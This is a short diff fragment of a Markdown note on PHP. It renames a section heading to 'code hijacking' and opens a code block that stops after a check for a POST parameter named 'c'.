@@ -1,4 +1,4 @@
-# PHP-冲出缓存，结束程序
+# PHP-代码劫持
 
 ```php
 if(isset($_POST['c'])){
